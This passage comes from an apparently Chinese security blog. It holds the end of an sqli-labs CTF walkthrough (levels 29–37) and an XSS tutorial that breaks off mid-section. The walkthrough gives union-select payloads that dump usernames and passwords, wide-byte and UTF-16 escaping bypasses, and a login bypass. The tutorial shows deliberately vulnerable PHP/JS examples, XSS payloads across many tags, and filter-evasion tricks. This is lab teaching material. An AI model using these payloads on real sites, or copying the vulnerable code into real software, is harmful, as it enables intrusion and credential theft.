<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>


<h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><p>和Less-29相比，index.php页面的错误信息显示被屏蔽了，闭合方式改为<code>&quot;$id&quot;</code>，其他照旧。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>


<h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><p>和Less-29相比，闭合方式改为<code>(&quot;$id&quot;)</code>，其他不变。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>


<h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><ul>
<li>查看源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="comment"># \ 转换为 \\</span></span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/&#x27;</span>. preg_quote(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>); </span><br><span class="line"><span class="comment"># 将 &#x27; 转为\&#x27;</span></span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>); </span><br><span class="line"><span class="comment"># 将 &quot; 转为\&quot;</span></span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                         </span><br></pre></td></tr></table></figure>
<ul>
<li>利用方法</li>
</ul>
<p>这里使用宽字节注入，在被过滤的符号前面加入<code>%df</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-32&#x2F;?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>


<h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><ul>
<li>查看源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$string</span>= addslashes(<span class="variable">$string</span>);</span><br></pre></td></tr></table></figure>
<p>此处过滤使用函数 <strong>addslashes()</strong> 返回在预定义字符之前添加反斜杠的字符串。</p>
<p>预定义字符是：  单引号（’）  双引号（”）  反斜杠（\）</p>
<p>这里依然可以使用宽字节注入绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-33&#x2F;?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>


<h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><ul>
<li>查看源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = addslashes(<span class="variable">$uname1</span>);</span><br><span class="line"><span class="variable">$passwd</span>= addslashes(<span class="variable">$passwd1</span>);</span><br></pre></td></tr></table></figure>
<p>和Less-33的过滤方法一样，只不过换成了POST方式提交数据，而POST方式无法直接使用<code>%df</code>来进行注入，需要用Burp Suite进行抓包改包。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305173404414.png" alt="image-20210305173404414"></p>
<p>在图中的%27前面加上<code>%df</code>即可。</p>
<ul>
<li>这里还有另一种思路</li>
</ul>
<p>将 utf-8 转换为 utf-16 或 utf-32，例如将 ‘ 转为 utf-16 为 � ‘ 。我们就 可以利用这个方式进行尝试。</p>
<p>可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">echo</span> \<span class="string">&#x27;|iconv -f utf-8 -t utf-16</span></span><br><span class="line"><span class="string">��&#x27;</span></span><br><span class="line">➜  ~ <span class="built_in">echo</span> \<span class="string">&#x27;|iconv -f utf-8 -t utf-32</span></span><br><span class="line"><span class="string">��&#x27;</span></span><br></pre></td></tr></table></figure>
<p>尝试一个经典的万能密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;�&#39; or 1#&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305175129233.png" alt="image-20210305175129233"></p>
<h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>这一关的参数的数据类型为数字型，也就是说无需<code>&#39;</code>来闭合参数，但是这里的过滤措施和Less-33完全一致，相当与无用功。。直接进行联合注入即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>


<h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><ul>
<li>查看源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$string</span>= mysql_real_escape_string(<span class="variable">$string</span>)</span><br></pre></td></tr></table></figure>
<p>这里使用了**mysql_real_escape_string()**函数进行转义，如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。下列字符受影响： </p>
<p> (\x00)  (\n)  (\r)   (‘)  (“)  (\x1a)</p>
<p>这里仍然可以使用宽字节注入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-36&#x2F;?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>


<h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>本关与 34 关是大致相似的，区别在于处理 post 内容用的是 <strong>mysql_real_escape_string()</strong> 函数，而不是 **addslashes()**函数，但是原理是一样的。都是通过截包改包的方法进行注入。或者使用将 utf-8 转换为 utf-16 或 utf-32的方法直接在hackbar进行POST请求。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<ul>
<li><a class="link"   href="https://www.cnblogs.com/lcamry/" >lcamry 大佬的《MySQL注入天书》<i class="fas fa-external-link-alt"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS总结</title>
    <url>/2021/03/24/XSS%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="XSS总结"><a href="#XSS总结" class="headerlink" title="XSS总结"></a>XSS总结</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，比较合适的方式应该叫做跨站脚本攻击。</p>
<p>跨站脚本攻击是一种常见的web安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶意代码等行为。</p>
<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>XSS漏洞可能会给网站带来以下的一些危害：</p>
<ol>
<li>网络钓鱼，盗取用户的账号</li>
<li>获取用户的cookie信息，其中可能存在 Session ID 等信息，攻击者可以利用这些信息冒充用户登陆服务器。</li>
<li>劫持用户浏览器，强制弹窗，转跳刷流量。</li>
<li>攻击者能够在一定限度内记录用户的键盘输入。</li>
<li>攻击者通过CSRF等方式以用户身份执行危险操作。</li>
<li>获取客户端隐私信息。</li>
<li>XSS蠕虫。</li>
<li>利用XSS漏洞扫描用户内网。</li>
</ol>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号 <code>&lt;</code> 被看作是HTML标签的开始，之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，<strong>当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行</strong>。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。</p>
<p>example:（反射型）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; </span><br><span class="line">&lt;title&gt;XSS原理重现&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xss_input&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$xss &#x3D; $_GET[&#39;xss_input&#39;];</span><br><span class="line">echo &#39;你输入的字符为&lt;br&gt;&#39;.$xss;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>这里我们通过GET方法把<code>xss_input</code>参数到后端，后端没有对该参数做任何检查就把该参数显示出来。</p>
<p>当我们提交这样一段数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>浏览器就会把这一段内容当成HTML标签解析，导致里面的 JS 语句被执行，而不是当作文本输出。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308102212318.png" alt="image-20210308102212318"></p>
<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>反射型跨站脚本（Reflected Cross-site Scripting）也称作非持久型、参数型跨站脚本。反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。</p>
<p>简介中的 example 就是一个简单的反射型XSS漏洞模板</p>
<p>我们查看页面元素可以看到我们输入的内容被当作了HTML标签执行。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308102914047.png" alt="image-20210308102914047"></p>
<p>由于反射型XSS需要用户访问该连接才能实现，因此容易被有安全意识的用户发现，因此攻击者可以利用短网址或者二维码这样的方式来进行障眼法，避免含有攻击代码的URL直接暴露在用户的面前。</p>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型跨站脚本（Stored Cross-site Scripting）也叫持久型XSS，意思是用户提交的数据会被存储在后端（不管是数据库、内存还是文件系统等），当攻击者提交的包含有XSS攻击的代码被存储在后端中，其他用户访问该页面的时候，后端会将数据取出来显示在页面上，这时候用户就会受到XSS攻击，最典型的应用是留言板。</p>
<p>example：</p>
<ul>
<li>首先我们本地新建一个名字叫做<code>xss</code>的数据库，里面新建一个<code>message</code>表，用来存放用户的留言信息，字段名分别是<code>id</code>、<code>username</code>、<code>message</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">NAMES</span> utf8mb4;</span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`message`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`message`</span>  (</span><br><span class="line">                            <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">                            <span class="string">`username`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">                            <span class="string">`message`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">                            PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>) <span class="keyword">USING</span> BTREE</span><br><span class="line">) <span class="keyword">ENGINE</span> = MyISAM AUTO_INCREMENT = <span class="number">17</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8 <span class="keyword">COLLATE</span> = utf8_general_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>然后是后端页面</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$db_host &#x3D; &quot;localhost&quot;;</span><br><span class="line">$db_user &#x3D; &quot;root&quot;;</span><br><span class="line">$db_passwd &#x3D; &quot;&quot;;</span><br><span class="line">$db_dbname &#x3D; &quot;xss&quot;;</span><br><span class="line">$conn &#x3D; new mysqli($db_host, $db_user, $db_passwd, $db_dbname);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 前端用户输入表单 --&gt;</span><br><span class="line">&lt;h1&gt;留言板的存储型XSS&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;form  method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; placeholder&#x3D;&quot;姓名&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;message&quot; placeholder&#x3D;&quot;请输入您的留言&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;*直接将留言插入到数据库中*&#x2F;</span><br><span class="line">$username&#x3D;$_POST[&#39;username&#39;];</span><br><span class="line">$message&#x3D;$_POST[&#39;message&#39;];</span><br><span class="line">if($username and $message)</span><br><span class="line">&#123;</span><br><span class="line">    $sql&#x3D;&quot;INSERT INTO xss.message (&#96;username&#96;, &#96;message&#96;) VALUES (&#39;&#123;$username&#125;&#39;,&#39;&#123;$message&#125;&#39;)&quot;;</span><br><span class="line">    if ($conn-&gt;query($sql) &#x3D;&#x3D;&#x3D; TRUE) &#123;</span><br><span class="line">        echo &quot;留言成功&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;请填写完整信息&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*查询数据库中的留言信息*&#x2F;</span><br><span class="line">$sql &#x3D; &quot;SELECT username, message FROM xss.message&quot;;</span><br><span class="line">$result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">    while($row &#x3D; $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">        echo &quot;用户名：&quot; . $row[&quot;username&quot;]. &quot;留言内容:&quot; . $row[&quot;message&quot;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;暂无留言&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308114155994.png" alt="image-20210308114155994"></p>
<p>当我们构造<code>&lt;script&gt;alert(11)&lt;\script&gt;</code>输入，然后查看数据库</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308114329338.png" alt="image-20210308114329338"></p>
<p>发现我们的JS攻击语句已经被存储到数据库中。</p>
<p>当用户访问该页面的时候就会执行该JS语句，再察看页面元素，发现HTML标签被解析出来。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308115104242.png" alt="image-20210308115104242"></p>
<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>通过修改页面的DOM节点形成的XSS，称之为DOM XSS。它和反射型XSS、存储型XSS的差别在于，DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。</p>
<p>example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;DOM Based XSS Demo&lt;&#x2F;title&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function xsstest()</span><br><span class="line">&#123;</span><br><span class="line">    var str &#x3D; document.getElementById(&quot;input&quot;).value;</span><br><span class="line">    document.getElementById(&quot;output&quot;).innerHTML &#x3D; &quot;&lt;img src&#x3D;&#39;&quot;+str+&quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;output&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;input&quot; size&#x3D;50 value&#x3D;&quot;&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;submit&quot; onclick&#x3D;&quot;xsstest()&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>功能很简单，用户输入框插入图片地址后，页面会将图片插入在 id=”output” 的 div 标签中，从而显示在网页上。</p>
<p>当攻击者输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x&#39; onerror&#x3D;&#39;javascript:alert(&#x2F;xss&#x2F;)</span><br></pre></td></tr></table></figure>
<p>会直接在 img 标签中加入 onerror 事件，该事件是当图片加载出错时执行的语句，当我们输入无效的 src 地址导致图片加载出错时就会触发事件，从而实现弹窗效果。</p>
<h2 id="XSS常用标签"><a href="#XSS常用标签" class="headerlink" title="XSS常用标签"></a>XSS常用标签</h2><h3 id="script"><a href="#script" class="headerlink" title="script"></a>script</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span>alert(&quot;xss&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="img"><a href="#img" class="headerlink" title="img"></a>img</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="input"><a href="#input" class="headerlink" title="input"></a>input</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="details"><a href="#details" class="headerlink" title="details"></a>details</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="svg"><a href="#svg" class="headerlink" title="svg"></a>svg</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="video-audio"><a href="#video-audio" class="headerlink" title="video/audio"></a>video/audio</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="a"><a href="#a" class="headerlink" title="a"></a>a</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="form"><a href="#form" class="headerlink" title="form"></a>form</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="XSS常见注入方式"><a href="#XSS常见注入方式" class="headerlink" title="XSS常见注入方式"></a>XSS常见注入方式</h2><ul>
<li>在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。</li>
<li>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</li>
<li>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</li>
<li>在标签的 href、src 等属性中，包含 <code>javascript:</code> 等可执行代码。</li>
<li>在 onload、onerror、onclick 等事件中，注入不受控制代码。</li>
<li>在 style 属性和标签中，包含类似 <code>background-image:url(&quot;javascript:...&quot;);</code> 的代码（新版本浏览器已经可以防范）。</li>
<li>在 style 属性和标签中，包含类似 <code>expression(...)</code> 的 CSS 表达式代码（新版本浏览器已经可以防范）。</li>
</ul>
<h3 id="HTML无法执行脚本的标签"><a href="#HTML无法执行脚本的标签" class="headerlink" title="HTML无法执行脚本的标签"></a>HTML无法执行脚本的标签</h3><p>在某些标签的内部，通过内嵌引入的脚本是不会执行的，需要通过闭合原有的标签才能执行。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xmp</span>&gt;</span><span class="tag">&lt;/<span class="name">xmp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span> (noscript 元素用来定义在脚本未被执行时的替代内容(文本))</span><br><span class="line"><span class="tag">&lt;<span class="name">noframes</span>&gt;</span><span class="tag">&lt;/<span class="name">noframes</span>&gt;</span> (noframes 元素可为那些不支持框架的浏览器显示文本。noframes 元素位于 frameset 元素内部)</span><br><span class="line"><span class="tag">&lt;<span class="name">plaintext</span>&gt;</span><span class="tag">&lt;/<span class="name">plaintext</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>还有一些标签，直接无法嵌套其他标签，系统会提示报错：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="XSS常见绕过方式"><a href="#XSS常见绕过方式" class="headerlink" title="XSS常见绕过方式"></a>XSS常见绕过方式</h2><h3 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h3><ul>
<li><p><strong>使用上述的其他标签代替</strong></p>
</li>
<li><p><strong>大小写绕过</strong></p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScRipt</span>&gt;</span><span class="javascript">aLErt(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">ScRipt</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>双写绕过</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scrscriptipt</span>&gt;</span>alert(&#x27;xss&#x27;)<span class="tag">&lt;/<span class="name">scrscriptipt</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>字符拼接</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="string">`xss`</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>编码绕过</strong></p>
<ul>
<li>Unicode编码</li>
</ul>
